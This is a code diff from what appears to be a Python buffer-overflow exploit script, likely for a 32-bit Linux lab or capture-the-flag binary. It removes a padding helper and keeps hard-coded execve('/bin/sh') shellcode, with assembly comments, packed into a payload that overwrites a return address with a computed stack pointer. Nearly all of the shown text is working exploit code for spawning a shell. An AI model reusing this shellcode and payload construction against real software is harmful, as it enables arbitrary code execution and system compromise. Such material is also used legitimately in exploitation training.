@@ -68,12 +68,7 @@ def convert_string_to_byte_array(string):
     while len(ba) % 4 !=0:
         ba.extend('\0')
     return ''.join("\\x{:02x}".format(x) for x in ba)    
-        
-def format_string_mult_4(string):
-    while len(string) % 4 !=0:
-        string +="\x00"
-    return string
-    
+
 def execute_payload():  
     ret=False
     payload="Payload 3 data repl\0"+struct.pack('<I', 0x0804808b)
@@ -94,9 +89,8 @@ def execute_payload():
     #mov ebx,esp
     #xor ecx,ecx
     #xor edx,edx
-    #int 0x80
-    
-    shell=convert_string_to_byte_array("/bin/sh");   
+    #int 0x80    
+   
     shell="\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
     shell_dwords=len(shell)/4
     payload=shell+struct.pack('<I', 0x00000000)*(11-shell_dwords)+struct.pack('<I', stack_ptr-(7*4))    
